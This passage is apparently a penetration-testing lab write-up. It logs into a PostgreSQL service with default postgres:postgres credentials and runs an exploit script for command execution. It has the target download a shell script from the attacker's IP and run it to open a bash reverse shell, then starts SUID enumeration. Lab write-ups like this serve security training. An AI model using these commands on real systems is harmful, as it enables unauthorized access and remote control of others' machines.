
# 5437

Now we find postgres so trying login:
With postgres:postgres
```
psql -U postgres -W -h 192.168.212.47 -p 5437
```
Now checking version:
```
SELECT version();SD
```
![](attachment/a3cd592205326c1858506edd116aaa7e.png)

Now we can use an exploit for this version:
![](attachment/7aac33fec186c3dc6ba6a900b33d258d.png)
```
python3 postgres.py -i 192.168.212.47 -P postgres -U postgres -p 5437 -c whoami 
```

![](attachment/099f610db6ebc5c10a02af87841f47be.png)Now to get a shell:
shell.sh:
```
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.236/445 0>&1
```
```
python3 postgres.py -i 192.168.212.47 -P postgres -U postgres -p 5437 -c 'wget http://192.168.45.236/shell.sh'

python3 postgres.py -i 192.168.212.47 -P postgres -U postgres -p 5437 -c 'bash shell.sh' 
```
Now we get a shell:
![](attachment/8672b2c73b4da464241cbe15dbed38cc.png)\\
Now running linpeas.

We dont fine anything.
Running manual enumeration to find SUID binaries:
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
![](attachment/a8a8f9715ecc31bb1a2994df88bca255.png)

